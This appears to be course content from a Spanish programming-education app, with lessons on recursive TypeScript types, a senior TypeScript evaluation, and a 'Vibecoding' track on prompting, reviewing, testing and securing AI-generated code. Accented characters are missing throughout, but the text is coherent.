En la cima del dominio de TypeScript, nos encontramos con estructuras que se referencian a s mismas. Esto es vital para manejar datos arbreos como el DOM, sistemas de archivos o JSON anidado.

## 1. Tipos Recursivos Bsicos
Define un tipo que puede contenerse a s mismo.

\`\`\`typescript
type JSONValue =
  | string
  | number
  | boolean
  | null
  | { [key: string]: JSONValue }
  | JSONValue[];

const data: JSONValue = {
  name: "Project",
  meta: {
    tags: ["typescript", "advanced"],
    version: 1.0
  }
};
\`\`\`

## 2. Deep Partial y Deep Readonly
Los utilitarios nativos de TS (\`Partial\`, \`Readonly\`) son "shallow" (superficiales). Solo afectan al primer nivel. Para un objeto anidado, necesitamos recursividad.

\`\`\`typescript
type DeepReadonly<T> = {
  readonly [P in keyof T]: T[P] extends object
    ? DeepReadonly<T[P]>
    : T[P];
};

interface User {
  id: number;
  profile: {
    bio: string;
    social: { twitter: string };
  };
}

const user: DeepReadonly<User> = { ... };
user.profile.social.twitter = "@new"; // Error: Propiedad de solo lectura
\`\`\`

## 3. Aplanando Objetos (Key Paths)
Un truco avanzado de Senior es generar un tipo que represente todos los caminos posibles a una propiedad usando Template Literals.

\`\`\`typescript
type PathInto<T> = T extends object ? {
  [K in keyof T]: \`\${K & string}\` | \`\${K & string}.\${PathInto<T[K]>}\`
}[keyof T] : never;

type UserPaths = PathInto<User>; 
// "id" | "profile" | "profile.bio" | "profile.social" | "profile.social.twitter"
\`\`\`

## 4. Caso de Uso: Libreras de Validacin
Libreras como Zod o Yup usan estas tcnicas para inferir tipos de esquemas complejos sin que t tengas que escribirlos dos veces.

## 5. Ejercicio
Crea un tipo \`DeepNestedArray<T>\` que permita arrays dentro de arrays a cualquier nivel de profundidad (ej: \`[1, [2, [3, 4]]]\`).
`,completed:!1},{id:"ts-senior-evaluacion",title:"Evaluacin: TypeScript Senior Architect",level:"senior",content:`# Evaluacin Final: TypeScript Senior Architect

Esta evaluacin pone a prueba tu capacidad para disear sistemas de tipos complejos que garantizan seguridad y escalabilidad.

## Seccin 1: Desafo de Tipado de API (TypeScript Puro)

Disea un sistema de tipos para un "Query Builder".
Debe permitir encadenar mtodos como \`select\`, \`where\` y \`orderBy\`, y solo permitir seleccionar opciones que existan en la interfaz del modelo pasado.

\`\`\`typescript
interface User {
  id: number;
  name: string;
  email: string;
}

const query = createQuery<User>();
query.select("name").where("id", 1).orderBy("email"); // Valido
query.select("password"); // ERROR: 'password' no existe en User
\`\`\`

## Seccin 2: Anlisis de Performance del Compilador

**Escenario:** Tu proyecto tiene 2000 archivos TS y el tiempo de compilacin es de 5 minutos.
**Preguntas:**
1. Cmo usaras \`tsc --incremental\` para ayudar?
2. Qu impacto tiene abusar de los \`DeepPartial\` recursivos en el tiempo de type-checking?
3. Explica el uso de Project References para aislar mdulos lentos.

## Seccin 3: Refactor de Librera Legacy

Tienes una librera de procesamiento de datos que usa \`any\` en todas sus funciones de transformacin.
**Misin:** Propn una estrategia de refactorizacin usando Generics y Conditional Types para que los desarrolladores que consumen la librera recuperen el autocompletado y la seguridad sin tener que reescribir toda la lgica interna de inmediato.

## Seccin 4: Debugging en Produccin

**Bug:** Un cliente reporta que al cargar un perfil de usuario, la aplicacin parpadea y muestra datos del usuario anterior por un milisegundo antes de crashear.
**Sospecha:** Una "Race Condition" en una promesa que no fue cancelada y un tipado que asume que el objeto \`profile\` nunca es \`null\` (cuando en realidad es \`null\` mientras carga).
**Solucin Senior:** Implementar un estado de \`Union Discriminated\` que incluya un estado \`idle\`, \`loading\`, \`success\` y \`error\`.

---

## Criterios de Aprobacin
* [ ] Domino absoluto de Conditional Types y Mapped Types.
* [ ] Soluciones arquitectnicas que priorizan la mantenibilidad del equipo.
* [ ] Conocimiento de las tripas del compilador (Performance).
* [ ] Capacidad de diagnstico de errores sutiles en entornos distribuidos (Monorepos/APIs).
`,completed:!1,isProject:!0}]},gD={id:"vibecoding",title:"Vibecoding: Programacin con IA",description:"Domina el arte de dirigir Inteligencias Artificiales para crear software profesional a velocidades increbles.",completed:!1,track:"Nuevas Tecnologas",lessons:[{id:"vibe-01-que-es",title:"Qu es Vibecoding?",level:"junior",content:`# Leccin 1: Qu es Vibecoding realmente?

A menudo se confunde el uso de la IA en programacin con simplemente dejar que una mquina escriba por nosotros. El **Vibecoding** es un trmino moderno que describe un cambio de paradigma: el desarrollador ya no es solo quien escribe cada lnea de sintaxis, sino quien **dirige el flujo creativo y tcnico** de la aplicacin.

## 1. El Concepto de "Vibe"
No se trata de "sentimientos" vagos, sino de la capacidad de mantener una **visin de alto nivel** de lo que se quiere construir mientras se utiliza la IA para manejar la implementacin de bajo nivel.

*   **Programacin Tradicional:** Te preocupas por dnde va el punto y coma, el nombre exacto de la funcin y la lgica del bucle.
*   **Vibecoding:** Te preocupas por la arquitectura, la UX, el flujo de datos y cmo interactan las piezas. La IA se encarga de la sintaxis "tediosa".

## 2. El Origen del Trmino
El trmino surgi en comunidades de desarrolladores que utilizan herramientas como Perplexity, Cursor o Claude para construir aplicaciones complejas en horas, no semanas. Lo llaman "vibe" porque "se siente" como si estuvieras moldeando el software con palabras en lugar de picar piedra.

## 3. Por qu es el futuro?
La velocidad de desarrollo est aumentando exponencialmente. Un programador que sabe usar la IA es 10 veces ms productivo que uno que no. Sin embargo, para hacer "Vibecoding" real, **debes saber programar**.

> **Si no sabes programar, no puedes juzgar si la IA te est enviando a un precipicio tcnico.**

---

### Misin Junior:
Define con tus propias palabras qu prefieres: ser el "escritor" (tradicional) o el "director" (vibecoder). Explica por qu crees que entender la lgica bsica sigue siendo vital aunque la IA escriba el cdigo.
`,completed:!1},{id:"vibe-02-dirigir",title:"Dirigir vs Copiar",level:"junior",content:`# Leccin 2: Dirigir vs Copiar

El mayor error de un principiante es ver a la IA como un "copia-pega" avanzado de Stack Overflow. Esto lleva a aplicaciones frgiles que nadie entiende.

## 1. El Riesgo de Copiar sin Criterio
Cuando copias cdigo de una IA sin entenderlo:
*   **Deuda Tcnica Sugerida:** La IA puede sugerir patrones antiguos o ineficientes si el prompt no es claro.
*   **Imposibilidad de Debug:** Si algo falla, no sabes dnde mirar porque no "escribiste" la lgica.
*   **Alucinaciones:** La IA puede inventar mtodos que no existen en una librera.

## 2. El Arte de Dirigir
Dirigir significa tratar a la IA como un **Senior Developer** que trabaja para ti. T eres el **Arquitecto**.
*   **T decides el "Qu":** "Quiero un sistema de autenticacin que use JWT y guarde el estado en LocalStorage".
*   **T revisas el "Cmo":** La IA te da el cdigo. T lo lees. Si usa una librera que no quieres, la corriges: "No uses \`axios\`, usa \`fetch\` nativo".
*   **T validas:** Pruebas cada pieza antes de integrarla.

## 3. El Ciclo de Retroalimentacin
Dirigir es un dilogo constante:
1.  **Instruccin:** Clara y con contexto.
2.  **Generacin:** La IA propone.
3.  **Anlisis:** T evalas (Pensamiento Crtico).
4.  **Ajuste:** "Esto est bien, pero refactoriza la funcin para que sea ms legible".

---

### Misin Junior:
Busca en ChatGPT/Claude un cdigo para "Validar un email en JavaScript".
1.  Copia el cdigo.
2.  Pregntale a la IA: "Por qu usaste ese Regex?".
3.  Pdele: "Explcame paso a paso cmo funciona la lgica".
Si solo copiaste el regex sin entenderlo, ests fallando. Si preguntaste el por qu, ests *dirigiendo*.
`,completed:!1},{id:"vibe-03-prompts",title:"Estructura de Prompts",level:"junior",content:`# Leccin 3: Cmo estructurar Prompts Tcnicos

Un prompt tcnico no es una pregunta, es una **especificacin de requerimientos**.

## 1. La Frmula del Prompt Perfecto
Un buen prompt debe tener al menos estos 4 elementos:

1.  **Rol:** Quin es la IA (ej: "Acta como un experto en React y Clean Code").
2.  **Contexto:** Qu estamos haciendo (ej: "Estamos construyendo un dashboard de ventas para una tienda de mascotas").
3.  **Tarea:** Qu quieres exactamente (ej: "Genera un componente de tarjeta que muestre el nombre del producto, precio y una imagen").
4.  **Restricciones/Formato:** Reglas (ej: "Usa Tailwind CSS, no uses libreras externas de iconos, asegrate de que sea accesible con lectores de pantalla").

## 2. Ejemplo Comparativo

*   **Prompt Malo:** "Hazme una lista de productos en React".
    *   *Resultado:* Cdigo genrico, estilos feos, nombres de variables al azar.
*   **Prompt de Vibecoder:**
    > "Acta como un desarrollador Frontend Senior. Necesito un componente \`ProductList.jsx\` que reciba un array de objetos desde las props. Cada objeto tiene \`id\`, \`name\`, \`price\` y \`category\`. Usa Tailwind para el grid (3 columnas en desktop, 1 en mobile). Si el precio es mayor a 100, muestra un badge de 'Premium'. El cdigo debe ser modular y seguir los principios SOLID."

## 3. El uso de "System Prompts"
Si usas herramientas como Cursor o IDEs con IA, puedes configurar archivos como \`.cursorrules\` para que la IA siempre sepa tus preferencias (ej: "Siempre usa flecha para las funciones", "Siempre escribe en espaol").

---

### Misin Junior:
Redacta un prompt para crear un "Formulario de Registro" que incluya:
*   Campos: Nombre, Email, Password.
*   Tecnologa: HTML y CSS puro.
*   Validacin: Que el password tenga al menos 8 caracteres (usando solo atributos HTML).
*   Estilo: Dark mode elegante.
Pgalo en una IA y mira la diferencia entre el cdigo generado con este prompt detallado vs uno simple.
`,completed:!1},{id:"vibe-04-pedir-codigo",title:"Cmo pedir cdigo",level:"junior",content:`# Leccin 4: Cmo pedir cdigo correctamente

Pedir cdigo no es pedir magia. Es dar instrucciones de ingeniera.

## 1. Divide y Vencers (Chunking)
No pidas una aplicacin entera en un solo prompt. La IA tiene una "ventana de contexto" (memoria) limitada.
*   **MAL:** "Hazme un clon de Spotify". (La IA fallar, ser genrico y tendr bugs).
*   **BIEN:**
    *   Prompt 1: "Aydame a definir el esquema de datos para una cancin".
    *   Prompt 2: "Crea el componente de la barra de reproduccin (UI)".
    *   Prompt 3: "Implementa la lgica de Play/Pause usando la API de Audio".

## 2. Da Ejemplo (Few-Shot Prompts)
Si quieres que el cdigo tenga un estilo especfico, dale un ejemplo.
> "Aqu tienes un ejemplo de cmo escribo mis componentes: [Cdigo]. Ahora, escribe un nuevo componente llamado \`UserProfile\` siguiendo este mismo patrn de nombres y estructura."

## 3. Pide explicaciones, no solo resultados
Un truco avanzado es pedirle a la IA que piense antes de escribir:
> "Antes de darme el cdigo, analiza los posibles desafos de rendimiento de este componente y luego escribe la versin optimizada."

---

### Misin Junior:
Pdele a una IA que genere una funcin en JavaScript para "Filtrar un array de tareas por estado (completado o no)".
Condicin extra: "No me des el cdigo directamente. Primero descrbeme cul sera el mejor mtodo de array para usar (\`map\`, \`filter\`, \`reduce\`) y por qu. Despus de mi confirmacin, dame el cdigo".
Esta es la tcnica de la **Confirmacin de Lgica**.
`,completed:!1},{id:"vibe-05-iteracion",title:"Iteracin de Cdigo",level:"junior",content:`# Leccin 5: La Magia de la Iteracin

El primer resultado de la IA casi nunca es el final. El Vibecoder es un **escultor**.

## 1. Qu es iterar?
Iterar es el proceso de refinar el cdigo a travs de mltiples ciclos de retroalimentacin.

## 2. Tipos de Iteracin
*   **Iteracin por Estilo:** "El cdigo funciona, pero usa variables con nombres ms cortos y descriptivos".
*   **Iteracin por Funcionalidad:** "Ahora agrega un botn para que el usuario pueda borrar este elemento de la lista".
*   **Iteracin por Error:** "Me da un error en la lnea 12, parece que \`data\` es \`undefined\`. Corrige el cdigo para manejar este caso nulo".

## 3. Manteniendo el Hilo
Cuando iteras, no abras un chat nuevo cada vez. El historial es vital para que la IA entienda qu cambi y por qu.
*   *Tip:* Si te gusta cmo qued una parte pero otra no, di: "Mantn la lgica de la funcin \`X\` exactamente igual, pero cambia el diseo del componente \`Y\`".

---

### Misin Junior:
1. Crea un prompt para un botn simple en CSS que diga "Click me".
2. **Iteracin 1:** Pdele que el botn sea azul y se vuelva naranja al pasar el mouse (hover).
3. **Iteracin 2:** Pdele que tenga una sombra suave y bordes redondeados.
4. **Iteracin 3:** Pdele que el botn "pulse" (animacin) suavemente todo el tiempo.
Mira cmo el cdigo crece y se vuelve ms complejo gracias a tus instrucciones incrementales.
`,completed:!1},{id:"vibe-06-bugs",title:"Detectando Bugs de IA",level:"junior",content:`# Leccin 6: Detectando Errores (Code Review IA)

Confiar ciegamente en la IA es el camino rpido al desempleo. Debes aprender a ser su crtico ms feroz.

## 1. Patrones de "Alucinacin"
La IA suele cometer estos errores comunes:
*   **Libreras Fantasma:** Importa archivos que nunca creaste o libreras que no estn instaladas.
*   **Lgica Circular:** Crea bucles infinitos por accidente al intentar resolver una dependencia.
*   **Sintaxis Hbrida:** Mezcla versiones (ej: mezcla React antiguo de clases con Hooks modernos).

## 2. Cmo auditar el cdigo
*   **Lee el cdigo:** No solo lo pegues. Si hay una lnea que no entiendes, pregntale a la IA: "Qu hace exactamente este \`Array.prototype.reduce\`?".
*   **Consola de Errores:** Si pegas el cdigo y tu navegador muestra rojo, copia el error de la consola y devulvelo a la IA: "Me das este error: [Error]. Cmo lo resolvemos?".
*   **Linting:** Usa herramientas como ESLint. Si la IA escribe cdigo feo o con inconsistencias, el linter te avisar.

## 3. Pruebas de Estrs
Pregntate: "Qu pasa si le paso un array vaco a esta funcin que hizo la IA? Explotar?". Si crees que s, pdele que aada manejo de errores.

---

### Misin Junior:
Pdele a la IA que genere un "Calculador de promedio de notas".
Luego, intenta pasarle un texto en lugar de un nmero. Si la aplicacin se rompe o dice \`NaN\`, has detectado un bug.
Pdele a la IA: "El cdigo falla cuando el usuario ingresa texto en lugar de nmeros. Corrige la validacin para que muestre un mensaje de error amigable".
`,completed:!1},{id:"vibe-07-limitaciones",title:"Limitaciones Modelos",level:"junior",content:`# Leccin 7: Limitaciones Reales de los Modelos

Para ser un Vibecoder profesional, debes conocer las fronteras de lo que la IA puede y no puede hacer hoy.

## 1. La Ventana de Contexto (Memoria a corto plazo)
Cada modelo (Claude, GPT-4, Gemini) tiene un lmite de cunta informacin puede procesar a la vez.
*   Si le pasas 50 archivos de tu proyecto, llegar un punto en que empezar a olvidar los primeros archivos o a confundir variables entre ellos.
*   **Junior Tip:** S especfico. No le pases todo el proyecto si solo quieres arreglar un botn.

## 2. El Corte de Conocimiento (Knowledge Cutoff)
Las IAs fueron entrenadas hasta una fecha especfica.
*   Si una librera de JavaScript (ej. Next.js) cambi su forma de funcionar ayer, la IA probablemente te dar cdigo de la versin anterior.
*   **Cmo solucionarlo:** Psale la documentacin actual como texto: "Usa este fragmento de la documentacin oficial para escribir el cdigo".

## 3. Lgica Compleja vs. Patrones Comunes
*   La IA es increble reconociendo patrones (ej. un CRUD, un Formulario).
*   La IA es propensa a fallar en lgica matemtica muy abstracta o algoritmos extremadamente especficos que no estn en internet.

## 4. El efecto "Loro Estocstico"
A veces la IA simplemente est prediciendo la siguiente palabra ms probable. No "entiende" el negocio. Puede sugerir una solucin que tcnicamente compila pero que no tiene sentido para los usuarios de tu app.

---

### Misin Junior:
Pregntale a tu IA favorita: "Cul es tu fecha de corte de conocimiento?".
Luego, intenta pedirle que use una feature de una librera que haya salido despus de esa fecha. Vers cmo intenta inventar algo o usa la versin vieja. Aprende a detectar este "desfase".
`,completed:!1},{id:"vibe-08-riesgos",title:"Riesgos de Dependencia",level:"junior",content:`# Leccin 8: Los Riesgos de la Dependencia (Sin Criterio)

El Vibecoding es una superpotencia, pero mal usado puede arruinar tu carrera.

## 1. La Parlisis del Pensamiento
Si dejas de pensar en la lgica y solo esperas a que la IA te d la respuesta, tu cerebro dejar de entrenar las conexiones necesarias para resolver problemas complejos.
*   **Consecuencia:** En una entrevista tcnica presencial (donde no haya IA), te quedars en blanco.

## 2. Cdigo "Frankenstein"
Ocurre cuando pegas trozos de cdigo de diferentes chats.
*   Chat 1 usa Variables Globales.
*   Chat 2 usa Hooks.
*   Chat 3 usa Estilos en lnea.
Tu proyecto se vuelve inmantenible y catico. Un programador Junior copia; un Vibecoder **unifica**.

## 3. Seguridad y Privacidad
NUNCA pegues API Keys, secretos de base de datos o informacin privada en un chat de IA. Esos datos podran terminar en el entrenamiento del modelo y ser vistos por otros.

## 4. El conformismo tcnico
Si la IA te da una solucin que "funciona", pero es ineficiente, y t la aceptas solo por terminar rpido, ests creando Deuda Tcnica.

---

### Misin Junior:
Escribe un pequeo cdigo a mano (sin IA) para invertir una cadena de texto (ej: "Hola" -> "aloH").
Luego, pide a la IA que lo haga de 3 formas diferentes.
Compara tu solucin con las de ella. Cul es ms legible? Cul es ms corta? Este ejercicio de **comparacin constante** es lo que te mantiene agudo.
`,completed:!1},{id:"vibe-09-final-junior",title:"Proyecto Junior Vibecoding",level:"junior",content:`# Proyecto Final Nivel Junior: "El Generador de Perfiles"

Es hora de demostrar que manejas la IA, y no al revs.

## Objetivo
Construir una aplicacin simple de "Tarjetas de Usuario" usando React y Tailwind CSS, pero la regla es: **Toda la estructura inicial debe ser generada por IA, pero t debes refinarla manualmente.**

## Tareas Tcnico-Prcticas

### 1. Generacin de Estructura (Prompt 1)
Pide a la IA que genere un componente \`UserCard\` que reciba un objeto de usuario con \`nombre\`, \`avatar\`, \`rol\` y \`bio\`. Usa Tailwind.

### 2. Iteracin de Estilo (Prompt 2)
Pide que el diseo sea ms moderno, use una sombra suave y bordes redondeados.

### 3. Iteracin de Funcionalidad (Manual)
Agrega un botn manual (escrbelo t) que al hacer click abra un alert con el nombre del usuario.

### 4. Deteccin de Bugs (Desafo)
Pdele a la IA que la lista de usuarios venga de una API (puedes usar \`jsonplaceholder\`).
Si la IA olvida el \`useEffect\` o los estados de carga (Loading/Error), **debes detectarlo y pedirle que lo agregue**.

## Evaluacin Crtica
Escribe un pequeo archivo \`REFLEXION.md\` respondiendo:
1. Qu parte del cdigo te dio la IA que t no hubieras sabido escribir?
2. Hubo alguna lnea que la IA escribi y que t decidiste borrar o cambiar? Por qu?
3. Si maana no existiera la IA, podras replicar esta aplicacin t solo?

## Entregable (Checklist)
*   [ ] Cdigo limpio y funcionando.
*   [ ] Sin errores en la consola del navegador.
*   [ ] Documento de reflexin completado.

Felicidades, Junior Vibecoder! Has pasado de copiar a dirigir.
`,completed:!1},{id:"vibe-10-arquitectura",title:"Arquitectura Asistida",level:"semi-senior",content:`# Leccin 10: Arquitectura Asistida por IA (Semi-Senior)

En este nivel, dejamos de pedir "componentes" y empezamos a pedir "sistemas".

## 1. Diseando con Diagramas
Antes de escribir una sola lnea de cdigo, usa la IA para validar tu arquitectura.
*   **Prompt:** "Acta como un Arquitecto de Software. Quiero construir un e-commerce de suscripcin. Cul es el mejor flujo para manejar pagos recurrentes y accesos denegados si el pago falla? Dame un diagrama en formato Mermaid".
*   La IA te ayudar a ver "puntos de fallo" que un desarrollador Junior ignora.

## 2. Definicin de la "Verdad" (Schemas)
Utiliza la IA para definir tus modelos de datos al inicio.
*   "Genera el esquema de base de datos para un sistema de gestin de hospitales, incluyendo pacientes, mdicos y citas. Asegrate de que las relaciones sean ptimas para consultas frecuentes".

## 3. Descubrimiento de Patrones
Pregunta a la IA qu patrn de diseo encaja mejor con tu problema:
*   "Debera usar un patrn \`Observer\` o \`Pub/Sub\` para notificaciones en tiempo real en una app de chat con 10,000 usuarios?".
*   Analiza los pros y contras que te da la IA con tu propia experiencia tcnica.

## 4. IA como Revisor de Arquitectura
Pgale una descripcin de tu estructura de carpetas y pdele:
*   "Analiza si mi estructura de carpetas sigue los principios de \`Clean Architecture\`. Hay algn acoplamiento innecesario entre mi capa de datos y mi UI?".

---

### Misin Semi-Senior:
Describe un sistema que quieras construir (ej. un clon de Uber Eats). Pdele a la IA que disee la arquitectura de microservicios. Cuando te d la respuesta, **cuestinala**: "Esa base de datos SQL para el tracking de geolocalizacin en tiempo real parece ineficiente, no sera mejor una NoSQL o Redis?". Mira cmo la IA cambia su razonamiento ante tu crtica tcnica.
`,completed:!1},{id:"vibe-11-contexto",title:"Gestin de Contexto",level:"semi-senior",content:`# Leccin 11: Cmo dar contexto completo (Context Window Management)

El mayor desafo del Semi-Senior es manejar proyectos grandes donde la IA ya no puede "leerlo todo".

## 1. El Problema de la Amnesia
Cuando tu proyecto supera los 50 archivos, la IA empezar a olvidar las variables de otros archivos. Esto genera bugs de "referencia no definida".

## 2. Herramientas de Contexto (Context Injection)
En herramientas profesionales como Cursor, puedes usar smbolos:
*   \`@Files\`: Para aadir archivos especficos al prompt.
*   \`@Folder\`: Para que la IA entienda toda la lgica de un mdulo.
*   \`@Web\`: Para documentaciones actualizadas.

## 3. Estrategia de "Inyectar" Conocimiento
Si usas ChatGPT/Claude web, crea un "resumen de contexto":
> "Estamos construyendo una app con: Next.js 14 (App Router), Tailwind y Firebase. No uses Redux, usamos Context API. Aqu te dejo el archivo de configuracin actual de auth: [Cdigo]. Ahora, basado en esto, crea la pgina de perfil."

## 4. Manteniendo la Coherencia
Si cambias un nombre de funcin en un archivo, **debes informar a la IA** antes de pedirle que trabaje en el archivo siguiente que depende de esa funcin.
*   *Tip:* Usa la IA para generar el archivo de "Contexto del Proyecto" (como un \`README.md\` tcnico) que siempre le pases al inicio de cada sesin.

---

### Misin Semi-Senior:
Prepara un prompt que incluya el contexto de **3 archivos diferentes** de tu proyecto (ej. un componente, su estilo CSS y su test). Pdele que haga un cambio global que afecte a los tres y observa si mantiene la coherencia entre ellos.
`,completed:!1},{id:"vibe-12-patrones",title:"Pattern Enforcement",level:"semi-senior",content:`# Leccin 12: Previniendo el Caos (Pattern Enforcement)

La IA es perezosa por naturaleza. Si puede tomar un atajo feo, lo har. Tu trabajo es obligarla a seguir tus patrones.

## 1. El Peligro del "Atajo"
A veces la IA te da una solucin que funciona hoy, pero ensucia el cdigo maana (ej. usar \`any\` en TypeScript o estilos en lnea en lugar de clases CSS reutilizables).

## 2. Instrucciones Negativas (Negative Prompts)
A veces es ms importante decir lo que **NUNCA** debe hacer:
*   "Nunca uses libreras externas para conos, usa SVGs puros".
*   "No utilices componentes de clase, solo componentes funcionales".
*   "No apliques lgica de negocio dentro del componente visual, extrela a un custom hook".

## 3. Gua de Estilo (.ai-rules)
Crea un archivo de configuracin para tu IA (como \`.cursorrules\`) donde definas:
*   "Siempre usa \`const\` para funciones".
*   "Usa espaol para los comentarios pero ingls para el cdigo".
*   "Cada componente debe tener su archivo de tests \`.test.js\` en la misma carpeta".

## 4. Auditora de Patrones
Antes de aceptar un archivo generado, pregntale:
*   "Este cdigo cumple con SRP (Single Responsibility Principle)? Refactoriza si es necesario".

---

### Misin Semi-Senior:
Pdele a la IA que cree una tabla de usuarios. Pero dale este prompt restrictivo:
"Crea una tabla en React. REGLAS: 1) No uses \`<table>\` (usa divs con Flexbox). 2) Los colores deben venir de una variable de CSS, no de Tailwind. 3) Si el cdigo tiene ms de 50 lneas, divdelo en dos archivos."
Vers cmo la IA se esfuerza ms por seguir tu estructura que por darte la solucin fcil.
`,completed:!1},{id:"vibe-13-modularizacion",title:"Modularizacin Pro",level:"semi-senior",content:`# Leccin 13: Modularizacin Pro (Proyectos Grandes)

En un proyecto profesional, el cdigo vive en mdulos. La IA tiende a querer ponerlo todo en un solo archivo Gigante. Evtalo.

## 1. El Enfoque Atmico
Pide a la IA que genere componentes por separado.
*   "Genera solo el tomo \`Button\`. Luego genera la molcula \`ButtonGroup\`. Finalmente el organismo \`Header\`".

## 2. Inyeccin de Interfaces (TypeScript)
Como Semi-Senior, debes usar TypeScript. La IA es excelente para inferir tipos, pero t debes definirlos primero.
*   **Prompt:** "Aqu est mi interfaz de TypeScript para un Producto. Basado en esto, genera un componente que lo muestre de forma segura (Type-safe)".

## 3. Manejo de Side-Effects (Lgica separada)
Aprende a pedir que la lgica pesada viva fuera de la UI.
*   "Crea un Custom Hook llamado \`useInventory\` que maneje el estado de los productos, la carga de datos desde la API y el filtrado. No incluyas nada de HTML en este archivo".

## 4. Unificando mdulos
Cuando tengas varios archivos generados, pdele a la IA que acte como un **Linter Humano**:
*   "Revisa estos 4 archivos y asegrate de que los nombres de las funciones y variables sean coherentes entre s".

---

### Misin Semi-Senior:
Toma un componente que ya tengas y pdele a la IA: "Extrae toda la lgica de los \`useState\` y \`useEffect\` a un Custom Hook separado. Deja el componente visual limpio, recibiendo solo los datos finales y las funciones por props". Este es el estndar de la industria.
`,completed:!1},{id:"vibe-14-tests",title:"Testing con IA",level:"semi-senior",content:`# Leccin 14: Testing Generado por IA (Sin trampas)

Escribir tests es tedioso. La IA es perfecta para esto, pero debes supervisar que el test sea til y no solo "verde".

## 1. Unit Testing (Jest / Vitest)
La IA puede generar el 90% del cdigo de un test unitario si el componente es pequeo.
*   **Prompt:** "Genera tests para esta funcin de suma. Asegrate de cubrir casos bordes como nmeros negativos, ceros y strings en lugar de nmeros".

## 2. El peligro del "Test en Espejo"
A veces, si la IA escribi el componente, escribir el test para que pase *su propia lgica*, aunque est mal.
*   **Cmo evitarlo:** Primero pide que escriba el test basado en una descripcin (TDD) y luego que escriba el cdigo que haga pasar ese test.

## 3. Integration Testing (Mocks)
Pide que simule llamadas a APIs:
*   "Genera un test de integracin para mi pgina de Login. Usa \`msw\` para mofas la respuesta de la API de autenticacin tanto para xito como para error 401".

## 4. Auditora de Cobertura
Pdele: "Qu escenarios me faltan testear en este componente? No me los des todos, dame solo los 3 ms crticos para la seguridad".

---

### Misin Semi-Senior:
Toma una funcin que calcule descuentos.
1. Pdele a la IA que genere los tests unitarios.
2. Agrega un bug a propsito en la funcin.
3. Corre el test. Si el test no falla, la IA hizo un mal test. Pdele que lo corrija para que detecte ese error especfico.
`,completed:!1},{id:"vibe-15-seguridad",title:"Seguridad en IA",level:"semi-senior",content:`# Leccin 15: Auditora de Seguridad (Criterio Humano)

La IA no es un experto en seguridad. Puede sugerir cdigo vulnerable si no se le gua.

## 1. Vulnerabilidades Comunes en IA
*   **XSS (Cross-Site Scripting):** La IA puede sugerir usar \`dangerouslySetInnerHTML\` en React sin advertirte del riesgo.
*   **SQL Injection:** Puede generar queries concatenando strings en lugar de usar parmetros.
*   **CORS Abierto:** Puede sugerir configurar \`Access-Control-Allow-Origin: *\` por comodidad.

## 2. Pidindole a la IA que sea un "Pentester"
Usa el rol de experto en seguridad:
*   "Acta como un experto en ciberseguridad. Revisa este fragmento de backend y dime si hay alguna superficie de ataque obvia o riesgo de inyeccin".

## 3. Secretos y Variables de Entorno
Si la IA pone una contrasea en una variable \`const password = "123"\`, reprndela. Oblgala a usar \`process.env\`.
*   "Refactoriza esto para que todas las credenciales se lean de variables de entorno".

## 4. Validacin de Inputs
Asegrate de que no confe en los datos del usuario:
*   "Agrega validacin de esquemas (con Zod o Joi) a este objeto que recibo por el body del request".

---

### Misin Semi-Senior:
Crea un formulario de comentarios donde el usuario pueda escribir. Pdele a la IA el cdigo para mostrar esos comentarios. Si la IA deja que el usuario escriba etiquetas \`<script>\`, es una brecha de seguridad. Corrige el cdigo aadiendo sanitizacin.
`,completed:!1},{id:"vibe-16-multi-modelo",title:"Workflow Multi-modelo",level:"semi-senior",content:`# Leccin 16: Uso Profesional de Modelos (Multi-model workflow)

Un desarrollador Semi-Senior no se casa con un solo modelo. Usa cada uno para lo que es mejor.

## 1. El Tro de Hierro
*   **Claude 3.5 Sonnet:** Actualmente el mejor para lgica de programacin, React y refactorizacin compleja. Tiene mejores "vibras" de cdigo limpio.
*   **GPT-4o:** Excelente para resolver errores de configuracin, DevOps y buscar docs antiguos.
*   **DeepSeek / Gemini:** Muy buenos para manejar contextos gigantes o explicar conceptos tericos paso a paso.

## 2. El Flujo de Trabajo Cruzado
1.  **Diseo:** Pide a uno (Claude) que haga la arquitectura.
2.  **Segunda Opinin:** Pgaselo a otro (GPT-4) y dile: "Claude hizo esto, dime qu errores de rendimiento o seguridad ves" (**Brainstorming asistido**).
3.  **Refinado:** Vuelve al primero con las crticas del segundo: "Se detect que X podra ser lento, corrgelo usando esta tcnica".

## 3. Comparacin de Resultados
Si tienes un error que un modelo no sabe resolver tras 3 intentos, **camina hacia otro chat con otro modelo**. A veces el "hilo" del chat se ensucia y un modelo nuevo con el contexto fresco resuelve el error en un segundo.

---

### Misin Semi-Senior:
Toma un fragmento de cdigo complejo que te haya dado una IA. Pgalo en otra diferente y dile: "Explcame cmo puedo optimizar este cdigo para que use menos memoria". Compara las dos sugerencias. Cul te convence ms tcnicamente?
`,completed:!1},{id:"vibe-17-prompt-adv",title:"Prompt Engineering Pro",level:"semi-senior",content:`# Leccin 17: Prompt Engineering Avanzado (Semi-Senior)

Deja de hacer preguntas y empieza a programar a la IA.

## 1. Chain of Thought (Cadena de pensamiento)
Obliga a la IA a razonar antes de tirar cdigo.
*   **Prompt:** "Analiza paso a paso los requisitos, define las dependencias necesarias y, por ltimo, escribe el cdigo completo".

## 2. Inyeccin de Roles Dinmicos
No uses solo "Senior Dev". S ms especfico:
*   "Acta como un Database Administrator experto en PostgreSQL y optimizacin de ndices".
*   "Acta como un experto en accesibilidad (A11y) con certificacin WCAG 2.1".

## 3. Delimitadores de Contexto
Usa marcas claras para que la IA sepa qu es cdigo y qu es instruccin:
> "Tarea: Actualiza el componente basado en la documentacin que sigue a continuacin.
> DOCUMENTACIN:
> \`\`\`
> [Contenido]
> \`\`\`
> CDIGO ACTUAL:
> \`\`\`javascript
> [Cdigo]
> \`\`\`"

## 4. One-Shot / Few-Shot (Ejemplos)
Si quieres que escriba con tu "vibe", entrnala con una sola muestra:
*   "Aqu tienes un ejemplo de cmo escribo mis controladores en Node.js: [Ejemplo]. Ahora, genera un nuevo controlador para la entidad 'Ordenes' siguiendo esta misma estructura de carpetas, manejo de errores y nomenclatura".

---

### Misin Semi-Senior:
Crea un "System Prompt" personal para tu IDE. Debe incluir: 1) Tu lenguaje preferido, 2) Tu estilo de funciones, 3) Tu librera de estilos y 4) Una regla sobre cmo quieres que se manejen los errores. salo durante una semana y nota cunto tiempo ahorras al no tener que repetir tus gustos de cdigo.
